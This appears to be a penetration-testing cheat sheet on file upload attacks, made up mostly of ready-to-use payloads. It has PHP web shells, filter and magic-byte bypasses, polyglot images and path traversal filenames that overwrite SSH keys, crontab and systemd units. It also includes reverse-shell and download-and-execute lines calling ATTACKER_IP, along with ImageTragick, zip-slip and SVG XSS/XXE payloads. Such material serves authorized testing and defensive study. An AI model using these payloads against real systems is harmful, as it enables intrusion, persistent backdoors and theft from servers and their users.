# File Upload Attacks

File upload vulnerabilities can be exploited for direct code execution via web shells or, when direct execution is not possible, combined with directory traversal to overwrite critical system files and achieve remote code execution.

---

## Upload Mechanism Discovery

### Common Upload Parameters

```
file=
upload=
attachment=
document=
image=
avatar=
profile_pic=
filename=
```

### Testing Upload Functionality

```bash
# Basic file upload test
curl -X POST -F "file=@test.txt" http://TARGET/upload.php

# Test different file extensions
curl -X POST -F "file=@test.jpg" http://TARGET/upload.php
curl -X POST -F "file=@test.pdf" http://TARGET/upload.php
```

---

## Web Shell Upload

### PHP Web Shells

```php
// Minimal PHP shell
<?php system($_GET['cmd']); ?>

// Obfuscated PHP shell
<?php $f='system'; $f($_GET[0]); ?>

// Advanced PHP shell
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

---

## Extension Filter Bypass

### Double Extensions

```
shell.php.jpg
backdoor.asp.png
shell.php5
shell.phtml
shell.phar
```

### Case Manipulation

```
SHELL.PHP
backdoor.ASP
shell.PhP
```

### Special Characters

```
shell.ph%00p
backdoor.as%20p
shell.php%00.jpg
```

---

## Content-Type Manipulation

```http
# Disguise as image
Content-Type: image/jpeg
Content-Type: image/png

# Disguise as document
Content-Type: application/pdf
Content-Type: text/plain
```

---

## Content Validation Bypass (Magic Bytes)

```bash
# Magic bytes for images
# JPEG: FF D8 FF
# PNG: 89 50 4E 47
# GIF: 47 49 46 38

# Prepend magic bytes to payload
echo -e '\xFF\xD8\xFF<?php system($_GET[0]); ?>' > shell.jpg.php

# GIF header trick
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

---

## Non-Executable File Upload (Directory Traversal)

When direct code execution is not possible, combine upload with directory traversal in the filename parameter to overwrite critical files.

### Directory Traversal in Filenames

#### Linux Targets

```bash
../../../../../../../root/.ssh/authorized_keys
../../../../../../../var/www/html/shell.php
../../../../../../../etc/crontab
../../../../../../../tmp/backdoor.sh
```

#### Windows Targets

```cmd
..\..\..\..\..\..\..\inetpub\wwwroot\shell.asp
..\..\..\..\..\..\..\users\administrator\.ssh\authorized_keys
..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
```

---

## SSH Key Injection Attack

### Generate SSH Key Pair

```bash
ssh-keygen -t rsa -b 2048 -f fileup -N ""
cat fileup.pub > authorized_keys
```

### Upload via Directory Traversal

```bash
# Target root user
filename="../../../../../../../root/.ssh/authorized_keys"

# Target specific user
filename="../../../../../../../home/www-data/.ssh/authorized_keys"
filename="../../../../../../../home/ubuntu/.ssh/authorized_keys"
```

### SSH Connection

```bash
ssh -i fileup -p 22 root@TARGET
ssh -o StrictHostKeyChecking=no -i fileup root@TARGET
```

---

## Cron Job Injection

### Create Malicious Cron Job

```bash
# Reverse shell cron job
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Download and execute
* * * * * wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
```

### Upload Cron File

```bash
filename="../../../../../../../etc/crontab"
filename="../../../../../../../var/spool/cron/crontabs/root"
filename="../../../../../../../etc/cron.d/backdoor"
```

---

## Configuration File Overwrite

### Apache .htaccess Injection

```apache
# Enable PHP execution in uploads directory
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# Directory listing
Options +Indexes
```

### IIS Web.config Manipulation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI" path="*.jpg" verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\php\php-cgi.exe"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

---

## Critical File Overwrite Targets

### Linux

```bash
# SSH
/root/.ssh/authorized_keys
/home/[user]/.ssh/authorized_keys

# Cron
/etc/crontab
/var/spool/cron/crontabs/root

# Web application
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.htaccess

# System
/etc/passwd
/etc/shadow
/etc/sudoers
```

### Windows

```cmd
# SSH
C:\users\administrator\.ssh\authorized_keys

# Web application
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\default.aspx
C:\xampp\htdocs\shell.php

# System
C:\windows\system32\drivers\etc\hosts
```

---

## Filename Obfuscation

```bash
# URL encoding
filename="..%2F..%2F..%2Froot%2F.ssh%2Fauthorized_keys"

# Double encoding
filename="..%252F..%252F..%252Froot%252F.ssh%252Fauthorized_keys"

# Mixed separators
filename="..\/..\/..\/root\/.ssh\/authorized_keys"

# Null byte injection
filename="../../../../../../../root/.ssh/authorized_keys%00.jpg"
```

---

## Service Configuration Overwrite

```ini
# Systemd service file for persistence
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
```

Target paths:
```
/etc/systemd/system/backdoor.service
/etc/init.d/backdoor
/etc/rc.local
```

---

## Modern Extension / Validation Bypasses

```text
# PHP-executable extensions to try when .php is blocked
.php .php3 .php4 .php5 .php7 .php8 .phtml .pht .phar .pgif .phtm .inc .phps .module
# Trailing chars / case / whitespace (Windows + some parsers strip them)
shell.php.       shell.php%20      shell.php%00.jpg     shell.pHp     shell.php::$DATA
shell.php/       shell.php.....    shell.php;.jpg       shell.asp;.jpg
# Double extension (first ext wins on some Apache mod_mime configs)
shell.php.jpg    shell.jpg.php     shell.php%00.jpg
# Apache config-overwrite to enable execution of allowed ext
.htaccess  ->  AddType application/x-httpd-php .jpg
# IIS web.config (see earlier) / IIS 7.x  shell.aspx;.jpg / shell.asp;1.jpg
# ASP.NET    .aspx .asmx .ashx .config .soap
# JSP        .jsp .jspx .jsw .jsv .jspf
```

### Content-Type & magic-byte combo

```bash
# Valid image header + PHP, served as .php (defeats getimagesize + extension blocklist)
printf 'GIF89a;\n<?php system($_GET[0]); ?>' > shell.php
# PNG/JPEG polyglot
exiftool -Comment='<?php system($_GET[0]); ?>' real.jpg -o shell.php.jpg
```

### Polyglot / image-with-payload

```bash
# PHP-JPEG polyglot (passes image checks, executes if interpreted as PHP)
# Inject into EXIF comment so it survives re-encoding:
exiftool -Comment='<?php echo shell_exec($_GET[c]); ?>' input.jpg
# GIF first bytes
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

### SVG / XML upload (XSS + XXE + SSRF)

```xml
<!-- Stored XSS via SVG -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><script>alert(document.cookie)</script></svg>
<!-- XXE via SVG (see xxe/) -->
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg><text>&x;</text></svg>
```

### ImageMagick / ImageTragick (RCE via image processor)

```text
# MSL / ImageTragick (CVE-2016-3714 family, still found): upload a crafted image the
# server processes with ImageMagick
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl ATTACKER/$(id)")'
pop graphic-context
```

### ZIP slip / path traversal on extract

```bash
# Craft an archive whose entry name escapes the extraction dir
# (zip-slip): ../../../var/www/html/shell.php inside the zip
python3 -c "import zipfile;z=zipfile.ZipFile('evil.zip','w');z.writestr('../../../../var/www/html/s.php','<?php system(\$_GET[0]);?>');z.close()"
```

### Client-side-only validation & race conditions

```text
- If extension/size is checked only in JS, intercept in Burp and change after the check.
- Race the upload: hit the file URL repeatedly while the server validates/deletes it
  (Turbo Intruder single-packet) — execute it in the window before it's removed/renamed.
- Overwrite an existing file (LFI/include target) via duplicate filename.
- Blind/stored upload: poison filename with XSS  "><img src=x onerror=alert(1)>.jpg
```

---

## Finding the Uploaded File

```bash
# Common upload dirs to brute after a successful upload
/uploads/  /files/  /images/  /media/  /tmp/  /assets/uploads/  /static/uploads/
/wp-content/uploads/  /uploadfiles/  /user/avatar/  /storage/
# Fuzz for it
ffuf -u "http://TARGET/uploads/FUZZ" -w names.txt
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite (+ **Upload Scanner** ext) | Intercept/modify uploads; automated bypass matrix |
| **fuxploider** | Automated upload-vuln detection & bypass |
| exiftool | Embed payloads in image metadata |
| curl | Test file upload endpoints |
| ssh-keygen | Generate SSH key pairs |
| Netcat | Reverse shell listeners |
| Python requests | Automated upload testing |

```bash
python3 fuxploider.py --url https://TARGET/upload --not-regex "wrong"
```

---

## References

- PortSwigger — File upload vulnerabilities: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings — Upload Insecure Files: https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/
- HackTricks — File upload: https://hacktricks.wiki/en/pentesting-web/file-upload/index.html
- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- fuxploider: https://github.com/almandin/fuxploider
